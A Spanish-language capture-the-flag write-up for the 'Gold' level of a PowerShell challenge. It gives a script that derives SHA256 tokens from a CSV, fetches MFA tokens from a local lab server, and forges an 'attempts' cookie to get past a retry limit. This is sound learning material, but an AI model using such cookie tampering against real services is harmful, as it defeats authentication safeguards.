Luego de completar el desafío en dificultad "**Silver**", el elfo nos dice que es posible hacer un bypass de lo que hicimos anteriormente y escribir un script para completar el desafío. Además, nos da pistas acerca de cómo podemos lograrlo:

![[ps18.png]]

![[ps19.png]]

Lo primero que se me ocurrió fue iterar sobre las filas del archivo `token_overview.csv` que contiene los endpoints (en principio) redactados y crear un archivo que contenga el Hash MD5, luego pipear cada uno de los contenidos de los archivos a `Get-FileHash -Algorithm SHA256` para obtener todos los hashes. Una vez hecho esto, intentar verificar los endpoints contra la URI `http://127.0.0.1:1225/tokens/<sha256sum>`.

Luego defino el siguiente script:

```powershell
$csv = "token_overview.csv"

Import-Csv -Path $csv | ForEach-Object {
	$md5 = $_.file_MD5hash
	$temp = New-TemporaryFile
	$md5 | Out-File -FilePath $temp.FullName -Encoding ASCII
	$hash = (Get-FileHash -Path $temp.FullName -Algorithm SHA256).Hash.Trim()
	Remove-Item -Path $temp.FullName -Force

	$Headers = @{
	    Authorization = $basicAuthValue
	    Cookie = "token=$md5"
	}

	$mfa = (Invoke-WebRequest -Uri 127.0.0.1:1225/tokens/$hash -Headers $Headers).Links.href

	$Headers = @{
	    Authorization = $basicAuthValue
	    Cookie = "token=$md5; mfa_token=$mfa"
	}

	(Invoke-WebRequest 127.0.0.1:1225/mfa_validate/$hash -Headers $Headers).Content
}
```

Este script obtiene los valores MD5 de cada fila del archivo `token_overview.csv`, los guarda en un archivo con el mismo nombre que el hash, luego obtiene el hash SHA256 de cada uno de ellos y los envía hacia `http://127.0.0.1:1225/mfa_validate/<sha256sum>` para su verificación.

Luego de ejecutado el script, obtuve:

![[ps21.png]]

Al parecer se está seteando una cookie "attempts", lo que se condice con lo que el elfo había dicho sobre el protocolo _EDR_. Entonces volví a ejecutar los mismos comandos que usé previamente, pero esta vez agregando la cookie "attempts" con un valor inicialmente de 50 para probar.

```powershell
$csv = "token_overview.csv"

Import-Csv -Path $csv | ForEach-Object {
	$md5 = $_.file_MD5hash
	$temp = New-TemporaryFile
	$md5 | Out-File -FilePath $temp.FullName -Encoding ASCII
	$hash = (Get-FileHash -Path $temp.FullName -Algorithm SHA256).Hash.Trim()
	Remove-Item -Path $temp.FullName -Force

	$Headers = @{
	    Authorization = $basicAuthValue
	    Cookie = "token=$md5"
	}

	$mfa = (Invoke-WebRequest -Uri 127.0.0.1:1225/tokens/$hash -Headers $Headers).Links.href

	$Headers = @{
	    Authorization = $basicAuthValue
	    Cookie = "token=$md5; mfa_token=$mfa; attempts=50"
	}

	(Invoke-WebRequest 127.0.0.1:1225/mfa_validate/$hash -Headers $Headers).Content
}
```

El output fue exitoso:

![[ps22.png]]

Aquí termina el desafío en dificultad "**Gold**".